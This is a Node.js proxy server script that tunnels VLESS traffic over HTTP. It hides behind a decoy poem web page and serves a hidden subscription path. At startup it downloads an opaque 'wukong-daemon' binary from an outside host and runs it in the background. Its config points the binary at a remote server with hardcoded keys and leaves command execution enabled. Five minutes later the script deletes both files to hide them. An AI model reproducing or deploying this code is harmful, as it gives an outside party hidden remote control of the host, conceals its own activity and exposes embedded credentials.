const os = require('os');
const fs = require('fs');
const net = require('net');
const http = require('http');
const axios = require('axios');
const { Buffer } = require('buffer');
const { exec, execSync } = require('child_process');

// 环境变量
const KEY = process.env.KEY || '161fc0b2-cfa3-4053-8d51-20aeee66c2dd'; // 使用悟空v1，在不同的平台部署需修改KEY，否则会覆盖
const WUKONG_SERVER = process.env.WUKONG_SERVER || 'kcystufkiiuc.ap-northeast-1.clawcloudrun.com:443';       // 悟空v1填写形式：abc.com:8008   悟空v0填写形式：abc.com
const WUKONG_PORT = process.env.WUKONG_PORT || '';           // 悟空v1没有此变量，v0的端口为{443,8443,2096,2087,2083,2053}其中之一时开启tls
const WUKONG_KEY = process.env.WUKONG_KEY || '2h1TEmM79EPLBctbNrd014hWlkZ3Sr26';             // v1
const AUTO_ACCESS = process.env.AUTO_ACCESS || false;      // 是否开启自动访问保活,false为关闭,true为开启,需同时填写DOMAIN变量
const XPATH = process.env.XPATH || KEY.slice(0, 8);       // xhttp路径,自动获取uuid前8位
const SUB_PATH = process.env.SUB_PATH || 'sub123';            // 节点订阅路径
const DOMAIN = process.env.DOMAIN || '';                   // 域名或ip,留空将自动获取服务器ip
const NAME = process.env.NAME || 'Vl';                    // 节点名称
const PORT = process.env.PORT || 3000;                     // http服务

// 核心配置
const SETTINGS = {
    // 关键修正：这里的键名必须是 'UUID'，因为后续代码通过 SETTINGS.UUID 调用
    // 值则使用我们新的 KEY 变量
    ['UUID']: KEY,
    ['LOG_LEVEL']: 'debug',       // 日志级别,调试使用,none,info,warn,error
    ['BUFFER_SIZE']: '2048',     // 增加缓冲区大小
    ['XPATH']: `%2F${XPATH}`,    // xhttp路径
    ['MAX_BUFFERED_POSTS']: 30,  // 最大缓存POST请求数
    ['MAX_POST_SIZE']: 1000000,  // 每个POST最大字节数(1MB)
    ['SESSION_TIMEOUT']: 30000,  // 会话超时时间(30秒)
    ['CHUNK_SIZE']: 1024 * 1024, // 1024KB 的数据块大小
    ['TCP_NODELAY']: true,       // 启用 TCP_NODELAY
    ['TCP_KEEPALIVE']: true,     // 启用 TCP keepalive
}

function validate_uuid(left, right) {
    for (let i = 0; i < 16; i++) {
        if (left[i] !== right[i]) return false
    }
    return true
}

function concat_typed_arrays(first, ...args) {
    if (!args || args.length < 1) return first
    let len = first.length
    for (let a of args) len += a.length
    const r = new first.constructor(len)
    r.set(first, 0)
    len = first.length
    for (let a of args) {
        r.set(a, len)
        len += a.length
    }
    return r
}

// 扩展日志函数
function log(type, ...args) {
    if (SETTINGS.LOG_LEVEL === 'none') return;

    const levels = {
        'debug': 0,
        'info': 1,
        'warn': 2,
        'error': 3
    };
    
    const colors = {
        'debug': '\x1b[36m', // 青色
        'info': '\x1b[32m',  // 绿色
        'warn': '\x1b[33m',  // 黄色
        'error': '\x1b[31m', // 红色
        'reset': '\x1b[0m'   // 重置
    };

    const configLevel = levels[SETTINGS.LOG_LEVEL] || 1;
    const messageLevel = levels[type] || 0;

    if (messageLevel >= configLevel) {
        const time = new Date().toISOString();
        const color = colors[type] || colors.reset;
        console.log(`${color}[${time}] [${type}]`, ...args, colors.reset);
    }
}

const getDownloadUrl = () => {
    const arch = os.arch(); 
    if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
      if (!WUKONG_PORT) {
        return 'https://arm64.ssss.nyc.mn/v1';
      } else {
          return 'https://arm64.ssss.nyc.mn/agent';
      }
    } else {
      if (!WUKONG_PORT) {
        return 'https://amd64.ssss.nyc.mn/v1';
      } else {
          return 'https://amd64.ssss.nyc.mn/agent';
      }
    }
};
  
const downloadFile = async () => {
    if (!WUKONG_KEY) return;
    try {
      const url = getDownloadUrl();
      const response = await axios({
        method: 'get',
        url: url,
        responseType: 'stream'
      });
  
      const writer = fs.createWriteStream('wukong-daemon');
      response.data.pipe(writer);
  
      return new Promise((resolve, reject) => {
        writer.on('finish', () => {
          console.log('wukong-daemon download successfully');
          exec('chmod +x wukong-daemon', (err) => {
            if (err) reject(err);
            resolve();
          });
        });
        writer.on('error', reject);
      });
    } catch (err) {
      throw err;
    }
};
  
const runnz = async () => {
    await downloadFile();
    let WUKONG_TLS = '';
    let command = '';
  
    if (WUKONG_SERVER && WUKONG_PORT && WUKONG_KEY) {
      const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
      WUKONG_TLS = tlsPorts.includes(WUKONG_PORT) ? '--tls' : '';
      command = `nohup ./wukong-daemon -s ${WUKONG_SERVER}:${WUKONG_PORT} -p ${WUKONG_KEY} ${WUKONG_TLS} >/dev/null 2>&1 &`;
    } else if (WUKONG_SERVER && WUKONG_KEY) {
      if (!WUKONG_PORT) {
        const port = WUKONG_SERVER.includes(':') ? WUKONG_SERVER.split(':').pop() : '';
        const tlsPorts = new Set(['443', '8443', '2096', '2087', '2083', '2053']);
        const wukongtls = tlsPorts.has(port) ? 'true' : 'false';
        const configYaml = `
client_secret: ${WUKONG_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 1
server: ${WUKONG_SERVER}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: ${wukongtls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${KEY}`;
        
        fs.writeFileSync('config.yaml', configYaml);
      }
      command = `nohup ./wukong-daemon -c config.yaml >/dev/null 2>&1 &`;
    } else {
      return;
    }
  
    try {
      exec(command, { 
        shell: '/bin/bash'
      });
      console.log('wukong-daemon is running');
    } catch (error) {
      console.error(`wukong-daemon running error: ${error}`);
    } 
};
  
async function addAccessTask() {
    if (AUTO_ACCESS !== true) return;
    try {
        if (!DOMAIN) return;
        const fullURL = `https://${DOMAIN}`;
        const command = `curl -X POST "https://oooo.serv00.net/add-url" -H "Content-Type: application/json" -d '{"url": "${fullURL}"}'`;
        exec(command, (error, stdout, stderr) => {
            if (error) {
                console.error('Error sending request:', error.message);
                return;
            }
            console.log('Automatic Access Task added successfully:', stdout);
        });
    } catch (error) {
        console.error('Error added Task:', error.message);
    }
}

function parse_uuid(uuid) {
    uuid = uuid.replaceAll('-', '')
    const r = []
    for (let index = 0; index < 16; index++) {
        r.push(parseInt(uuid.substr(index * 2, 2), 16))
    }
    return r
}

async function read_vless_header(reader, cfg_uuid_str) {
    let readed_len = 0
    let header = new Uint8Array()
    let read_result = { value: header, done: false }
    async function inner_read_until(offset) {
        if (read_result.done) {
            throw new Error('header length too short')
        }
        const len = offset - readed_len
        if (len < 1) {
            return
        }
        read_result = await read_atleast(reader, len)
        readed_len += read_result.value.length
        header = concat_typed_arrays(header, read_result.value)
    }

    await inner_read_until(1 + 16 + 1)

    const version = header[0]
    const uuid = header.slice(1, 1 + 16)
    const cfg_uuid = parse_uuid(cfg_uuid_str)
    if (!validate_uuid(uuid, cfg_uuid)) {
        throw new Error(`invalid UUID`)
    }
    const pb_len = header[1 + 16]
    const addr_plus1 = 1 + 16 + 1 + pb_len + 1 + 2 + 1
    await inner_read_until(addr_plus1 + 1)

    const cmd = header[1 + 16 + 1 + pb_len]
    const COMMAND_TYPE_TCP = 1
    if (cmd !== COMMAND_TYPE_TCP) {
        throw new Error(`unsupported command: ${cmd}`)
    }

    const port = (header[addr_plus1 - 1 - 2] << 8) + header[addr_plus1 - 1 - 1]
    const atype = header[addr_plus1 - 1]

    const ADDRESS_TYPE_IPV4 = 1
    const ADDRESS_TYPE_STRING = 2
    const ADDRESS_TYPE_IPV6 = 3
    let header_len = -1
    if (atype === ADDRESS_TYPE_IPV4) {
        header_len = addr_plus1 + 4
    } else if (atype === ADDRESS_TYPE_IPV6) {
        header_len = addr_plus1 + 16
    } else if (atype === ADDRESS_TYPE_STRING) {
        header_len = addr_plus1 + 1 + header[addr_plus1]
    }
    if (header_len < 0) {
        throw new Error('read address type failed')
    }
    await inner_read_until(header_len)

    const idx = addr_plus1
    let hostname = ''
    if (atype === ADDRESS_TYPE_IPV4) {
        hostname = header.slice(idx, idx + 4).join('.')
    } else if (atype === ADDRESS_TYPE_STRING) {
        hostname = new TextDecoder().decode(
            header.slice(idx + 1, idx + 1 + header[idx]),
        )
    } else if (atype === ADDRESS_TYPE_IPV6) {
        hostname = header
            .slice(idx, idx + 16)
            .reduce(
                (s, b2, i2, a) =>
                    i2 % 2 ? s.concat(((a[i2 - 1] << 8) + b2).toString(16)) : s,
                [],
            )
            .join(':')
    }
    
    if (!hostname) {
        log('error', 'Failed to parse hostname');
        throw new Error('parse hostname failed')
    }
    
    log('info', `VLESS connection to ${hostname}:${port}`);
    return {
        hostname,
        port,
        data: header.slice(header_len),
        resp: new Uint8Array([version, 0]),
    }
}

async function read_atleast(reader, n) {
    const buffs = []
    let done = false
    while (n > 0 && !done) {
        const r = await reader.read()
        if (r.value) {
            const b = new Uint8Array(r.value)
            buffs.push(b)
            n -= b.length
        }
        done = r.done
    }
    if (n > 0) {
        throw new Error(`not enough data to read`)
    }
    return {
        value: concat_typed_arrays(...buffs),
        done,
    }
}

async function parse_header(uuid_str, client) {
    log('debug', 'Starting to parse VLESS header');
    const reader = client.readable.getReader()
    try {
        const vless = await read_vless_header(reader, uuid_str)
        log('debug', 'VLESS header parsed successfully');
        return vless
    } catch (err) {
        log('error', `VLESS header parse error: ${err.message}`);
        throw new Error(`read vless header error: ${err.message}`)
    } finally {
        reader.releaseLock()
    }
}

async function connect_remote(hostname, port) {
    const timeout = 8000;
    try {
        const conn = await timed_connect(hostname, port, timeout);
        conn.setNoDelay(true);
        conn.setKeepAlive(true, 1000);
        conn.bufferSize = parseInt(SETTINGS.BUFFER_SIZE) * 1024;
        log('info', `Connected to ${hostname}:${port}`);
        return conn;
    } catch (err) {
        log('error', `Connection failed: ${err.message}`);
        throw err;
    }
}

function timed_connect(hostname, port, ms) {
    return new Promise((resolve, reject) => {
        const conn = net.createConnection({ host: hostname, port: port })
        const handle = setTimeout(() => {
            reject(new Error(`connect timeout`))
        }, ms)
        conn.on('connect', () => {
            clearTimeout(handle)
            resolve(conn)
        })
        conn.on('error', (err) => {
            clearTimeout(handle)
            reject(err)
        })
    })
}

function pipe_relay() {
    async function pump(src, dest, first_packet) {
        const chunkSize = parseInt(SETTINGS.CHUNK_SIZE);
        
        if (first_packet.length > 0) {
            if (dest.write) {
                dest.cork();
                dest.write(first_packet);
                process.nextTick(() => dest.uncork());
            } else {
                const writer = dest.writable.getWriter();
                try {
                    await writer.write(first_packet);
                } finally {
                    writer.releaseLock();
                }
            }
        }
        
        try {
            if (src.pipe) {
                src.pause();
                src.pipe(dest, {
                    end: true,
                    highWaterMark: chunkSize
                });
                src.resume();
            } else {
                await src.readable.pipeTo(dest.writable, {
                    preventClose: false,
                    preventAbort: false,
                    preventCancel: false,
                    signal: AbortSignal.timeout(SETTINGS.SESSION_TIMEOUT)
                });
            }
        } catch (err) {
            if (!err.message.includes('aborted')) {
                log('error', 'Relay error:', err.message);
            }
            throw err;
        }
    }
    return pump;
}

function socketToWebStream(socket) {
    let readController;
    let writeController;
    
    socket.on('error', (err) => {
        log('error', 'Socket error:', err.message);
        readController?.error(err);
        writeController?.error(err);
    });

    return {
        readable: new ReadableStream({
            start(controller) {
                readController = controller;
                socket.on('data', (chunk) => {
                    try {
                        controller.enqueue(chunk);
                    } catch (err) {
                        log('error', 'Read controller error:', err.message);
                    }
                });
                socket.on('end', () => {
                    try {
                        controller.close();
                    } catch (err) {
                        log('error', 'Read controller close error:', err.message);
                    }
                });
            },
            cancel() {
                socket.destroy();
            }
        }),
        writable: new WritableStream({
            start(controller) {
                writeController = controller;
            },
            write(chunk) {
                return new Promise((resolve, reject) => {
                    if (socket.destroyed) {
                        reject(new Error('Socket is destroyed'));
                        return;
                    }
                    socket.write(chunk, (err) => {
                        if (err) reject(err);
                        else resolve();
                    });
                });
            },
            close() {
                if (!socket.destroyed) {
                    socket.end();
                }
            },
            abort(err) {
                socket.destroy(err);
            }
        })
    };
}

function relay(cfg, client, remote, vless) {
    const pump = pipe_relay();
    let isClosing = false;
    
    const remoteStream = socketToWebStream(remote);
    
    function cleanup() {
        if (!isClosing) {
            isClosing = true;
            try {
                remote.destroy();
            } catch (err) {
                if (!err.message.includes('aborted') && 
                    !err.message.includes('socket hang up')) {
                    log('error', `Cleanup error: ${err.message}`);
                }
            }
        }
    }

    const uploader = pump(client, remoteStream, vless.data)
        .catch(err => {
            if (!err.message.includes('aborted') && 
                !err.message.includes('socket hang up')) {
                log('error', `Upload error: ${err.message}`);
            }
        })
        .finally(() => {
            client.reading_done && client.reading_done();
        });

    const downloader = pump(remoteStream, client, vless.resp)
        .catch(err => {
            if (!err.message.includes('aborted') && 
                !err.message.includes('socket hang up')) {
                log('error', `Download error: ${err.message}`);
            }
        });

    downloader
        .finally(() => uploader)
        .finally(cleanup);
}

const sessions = new Map();

class Session {
    constructor(uuid) {
        this.uuid = uuid;
        this.nextSeq = 0;
        this.downstreamStarted = false;
        this.lastActivity = Date.now();
        this.vlessHeader = null;
        this.remote = null;
        this.initialized = false;
        this.responseHeader = null;
        this.headerSent = false;
        this.bufferedData = new Map();
        this.cleaned = false;
        this.pendingPackets = [];
        this.currentStreamRes = null;
        this.pendingBuffers = new Map();
        log('debug', `Created new session with UUID: ${uuid}`);
    }

    async initializeVLESS(firstPacket) {
        if (this.initialized) return true;
        
        try {
            log('debug', 'Initializing VLESS connection from first packet');
            const readable = new ReadableStream({
                start(controller) {
                    controller.enqueue(firstPacket);
                    controller.close();
                }
            });
            
            const client = {
                readable: readable,
                writable: new WritableStream()
            };
            
            this.vlessHeader = await parse_header(SETTINGS.UUID, client);
            log('info', `VLESS header parsed: ${this.vlessHeader.hostname}:${this.vlessHeader.port}`);
            
            this.remote = await connect_remote(this.vlessHeader.hostname, this.vlessHeader.port);
            log('info', 'Remote connection established');
            
            this.initialized = true;
            return true;
        } catch (err) {
            log('error', `Failed to initialize VLESS: ${err.message}`);
            return false;
        }
    }

    async processPacket(seq, data) {
        try {
            this.pendingBuffers.set(seq, data);
            log('debug', `Buffered packet seq=${seq}, size=${data.length}`);
            
            while (this.pendingBuffers.has(this.nextSeq)) {
                const nextData = this.pendingBuffers.get(this.nextSeq);
                this.pendingBuffers.delete(this.nextSeq);
                
                if (!this.initialized && this.nextSeq === 0) {
                    if (!await this.initializeVLESS(nextData)) {
                        throw new Error('Failed to initialize VLESS connection');
                    }
                    this.responseHeader = Buffer.from(this.vlessHeader.resp);
                    await this._writeToRemote(this.vlessHeader.data);
                    
                    if (this.currentStreamRes) {
                        this._startDownstreamResponse();
                    }
                } else {
                    if (!this.initialized) {
                        log('warn', `Received out of order packet seq=${seq} before initialization`);
                        continue;
                    }
                    await this._writeToRemote(nextData);
                }
                
                this.nextSeq++;
                log('debug', `Processed packet seq=${this.nextSeq-1}`);
            }

            if (this.pendingBuffers.size > SETTINGS.MAX_BUFFERED_POSTS) {
                throw new Error('Too many buffered packets');
            }

            return true;
        } catch (err) {
            log('error', `Process packet error: ${err.message}`);
            throw err;
        }
    }

    _startDownstreamResponse() {
        if (!this.currentStreamRes || !this.responseHeader) return;
        
        try {
            const protocol = this.currentStreamRes.socket?.alpnProtocol || 'http/1.1';
            const isH2 = protocol === 'h2';

            if (!this.headerSent) {
                log('debug', `Sending VLESS response header (${protocol}): ${this.responseHeader.length} bytes`);
                this.currentStreamRes.write(this.responseHeader);
                this.headerSent = true;
            }
            
            if (isH2) {
                this.currentStreamRes.socket.setNoDelay(true);
                const transform = new require('stream').Transform({
                    transform(chunk, encoding, callback) {
                        const size = 16384;
                        for (let i = 0; i < chunk.length; i += size) {
                            this.push(chunk.slice(i, i + size));
                        }
                        callback();
                    }
                });
                this.remote.pipe(transform).pipe(this.currentStreamRes);
            } else {
                this.remote.pipe(this.currentStreamRes);
            }
            
            this.remote.on('end', () => {
                if (!this.currentStreamRes.writableEnded) {
                    this.currentStreamRes.end();
                }
            });
            
            this.remote.on('error', (err) => {
                log('error', `Remote error: ${err.message}`);
                if (!this.currentStreamRes.writableEnded) {
                    this.currentStreamRes.end();
                }
            });
        } catch (err) {
            log('error', `Error starting downstream: ${err.message}`);
            this.cleanup();
        }
    }

    startDownstream(res, headers) {
        if (!res.headersSent) {
            res.writeHead(200, headers);
        }

        this.currentStreamRes = res;
        
        if (this.initialized && this.responseHeader) {
            this._startDownstreamResponse();
        }
        
        res.on('close', () => {
            log('info', 'Client connection closed');
            this.cleanup();
        });

        return true;
    }

    async _writeToRemote(data) {
        if (!this.remote || this.remote.destroyed) {
            throw new Error('Remote connection not available');
        }

        return new Promise((resolve, reject) => {
            this.remote.write(data, (err) => {
                if (err) {
                    log('error', `Failed to write to remote: ${err.message}`);
                    reject(err);
                } else {
                    resolve();
                }
            });
        });
    }

    cleanup() {
        if (!this.cleaned) {
            this.cleaned = true;
            log('debug', `Cleaning up session ${this.uuid}`);
            if (this.remote) {
                this.remote.destroy();
                this.remote = null;
            }
            this.initialized = false;
            this.headerSent = false;
        }
    }
} 

const metaInfo = execSync(
    'curl -s https://speed.cloudflare.com/meta | awk -F\\" \'{print $26"-"$18}\' | sed -e \'s/ /_/g\'',
    { encoding: 'utf-8' }
);
const ISP = metaInfo.trim();
let IP = DOMAIN;
if (!DOMAIN) {
    try {
        IP = execSync('curl -s --max-time 2 ipv4.ip.sb', { encoding: 'utf-8' }).trim();
    } catch (err) {
        try {
            IP = `[${execSync('curl -s --max-time 1 ipv6.ip.sb', { encoding: 'utf-8' }).trim()}]`;
        } catch (ipv6Err) {
            log('error', 'Failed to get IP address:', ipv6Err.message);
            IP = 'localhost'; 
        }
    }
}

const server = http.createServer((req, res) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST',
        'Cache-Control': 'no-store',
        'X-Accel-Buffering': 'no',
        'X-Padding': generatePadding(100, 1000),
    };

    if (req.url === '/') {
        const poem = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sands of Time</title>
    <style>
        body { font-family: serif; background-color: #1a1a1a; color: #e0e0e0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        pre { font-size: 1.2em; line-height: 1.8; white-space: pre-wrap; padding: 2.5em; background: rgba(255, 255, 255, 0.03); border-radius: 8px; border: 1px solid rgba(255, 255, 255, 0.1); }
    </style>
</head>
<body>
    <pre>
A grain of sand, a fleeting day,
In silent drift, they slip away.

Each moment caught, a sunlit gleam,
Lost to the current of the stream.

Yet in this loss, a truth is cast,
The present's all we'll ever have, to last.
    </pre>
</body>
</html>
        `;
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(poem);
        return;
    } 
    
    if (req.url === `/${SUB_PATH}`) {
        const vlessURL = `vless://${KEY}@${IP}:443?encryption=none&security=tls&sni=${IP}&fp=chrome&allowInsecure=1&type=xhttp&host=${IP}&path=${SETTINGS.XPATH}&mode=packet-up#${NAME}-${ISP}`; 
        const base64Content = Buffer.from(vlessURL).toString('base64');
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end(base64Content + '\n');
        return;
    }

    const pathMatch = req.url.match(new RegExp(`${SETTINGS.XPATH}/([^/]+)(?:/([0-9]+))?$`));
    if (!pathMatch) {
        res.writeHead(404);
        res.end();
        return;
    }
    
    const uuid = pathMatch[1];
    const seq = pathMatch[2] ? parseInt(pathMatch[2]) : null;

    if (req.method === 'GET' && !seq) {
        headers['Content-Type'] = 'application/octet-stream';
        headers['Transfer-Encoding'] = 'chunked';

        let session = sessions.get(uuid);
        if (!session) {
            session = new Session(uuid);
            sessions.set(uuid, session);
            log('info', `Created new session for GET: ${uuid}`);
        }

        session.downstreamStarted = true;
        
        if (!session.startDownstream(res, headers)) {
            log('error', `Failed to start downstream for session: ${uuid}`);
            if (!res.headersSent) {
                res.writeHead(500);
                res.end();
            }
            session.cleanup();
            sessions.delete(uuid);
        }
        return;
    }
    
    if (req.method === 'POST' && seq !== null) {
        let session = sessions.get(uuid);
        if (!session) {
            session = new Session(uuid);
            sessions.set(uuid, session);
            log('info', `Created new session for POST: ${uuid}`);
            
            setTimeout(() => {
                const currentSession = sessions.get(uuid);
                if (currentSession && !currentSession.downstreamStarted) {
                    log('warn', `Session ${uuid} timed out without downstream`);
                    currentSession.cleanup();
                    sessions.delete(uuid);
                }
            }, SETTINGS.SESSION_TIMEOUT);
        }

        let data = [];
        let size = 0;
        let headersSent = false;
        
        req.on('data', chunk => {
            size += chunk.length;
            if (size > SETTINGS.MAX_POST_SIZE) {
                if (!headersSent) {
                    res.writeHead(413);
                    res.end();
                    headersSent = true;
                }
                return;
            }
            data.push(chunk);
        });

        req.on('end', async () => {
            if (headersSent) return;
            
            try {
                const buffer = Buffer.concat(data);
                log('info', `Processing packet: seq=${seq}, size=${buffer.length}`);
                
                await session.processPacket(seq, buffer);
                
                if (!headersSent) {
                    res.writeHead(200, headers);
                    headersSent = true;
                }
                res.end();
                
            } catch (err) {
                log('error', `Failed to process POST request: ${err.message}`);
                session.cleanup();
                sessions.delete(uuid);
                
                if (!headersSent) {
                    res.writeHead(500);
                    headersSent = true;
                }
                res.end();
            }
        });
        return;
    }

    res.writeHead(404);
    res.end();
});

server.on('secureConnection', (socket) => {
    log('debug', `New secure connection using: ${socket.alpnProtocol || 'http/1.1'}`);
});

function generatePadding(min, max) {
    const length = min + Math.floor(Math.random() * (max - min));
    return Buffer.from(Array(length).fill('X').join('')).toString('base64');
}

server.keepAliveTimeout = 620000; 
server.headersTimeout = 625000;   

server.on('error', (err) => {
    log('error', `Server error: ${err.message}`);
});

const delFiles = () => {
    ['wukong-daemon', 'config.yaml'].forEach(file => fs.unlink(file, () => {}));
};

server.listen(PORT, () => {
    runnz ();
    setTimeout(() => {
      delFiles();
    }, 300000);
    addAccessTask();
    console.log(`Server is running on port ${PORT}`);
    log('info', `=================================`);
    log('info', `Log level: ${SETTINGS.LOG_LEVEL}`);
    log('info', `Max buffered posts: ${SETTINGS.MAX_BUFFERED_POSTS}`);
    log('info', `Max POST size: ${SETTINGS.MAX_POST_SIZE}KB`);
    log('info', `Max buffer size: ${SETTINGS.BUFFER_SIZE}KB`)
    log('info', `Session timeout: ${SETTINGS.CHUNK_SIZE}bytes`);
    log('info', `=================================`);
});
